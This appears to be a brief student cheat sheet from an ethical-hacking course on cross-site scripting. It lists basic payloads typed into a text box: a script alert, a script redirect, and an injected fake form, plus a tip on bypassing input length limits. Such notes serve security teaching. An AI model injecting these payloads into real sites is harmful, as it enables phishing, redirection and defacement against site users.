# EHD Web Application Cheat Sheet

###### tags: `EHD`

## XSS
- Trigger alert in textbox input (Type into textbox)
```html
<script>alert("Hello!")</script>
```

- Redirect to another page (Type into textbox)
```html
<script>document.location="https://www.google.com"</script>
```

- If there is a maximum length limit for text input, inspect and modify the input element
![](https://i.imgur.com/e4sSKVf.png)

- Creating a fake form (type into textbox):
```html
<form>
Input1: <input type="text"><br>
Input2: <input type="text"><br>
<input type="submit" value="submit button">
</form>
```
